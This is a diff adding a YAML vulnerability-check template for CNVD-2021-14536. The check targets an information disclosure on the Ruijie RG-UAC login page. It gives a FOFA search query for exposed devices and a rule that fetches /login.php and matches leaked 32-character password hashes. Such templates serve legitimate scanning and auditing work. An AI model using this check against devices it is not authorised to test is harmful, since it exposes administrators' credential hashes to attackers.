@@ -1,0 +1,16 @@
+id: CNVD-2021-14536
+
+info:
+    name: Ruijie RG-UAC Information Disclosure
+    author: jweny(https://github.com/jweny) daffainfo
+    severity: high
+    description: |
+        fofa-query: 'title="RG-UAC登录页面"'
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /login.php
+        expression: response.status == 200 && response.body.bcontains(b"get_dkey_passwd") && "\"password\":\"[a-f0-9]{32}\"".bmatches(response.body)
+expression: r0()
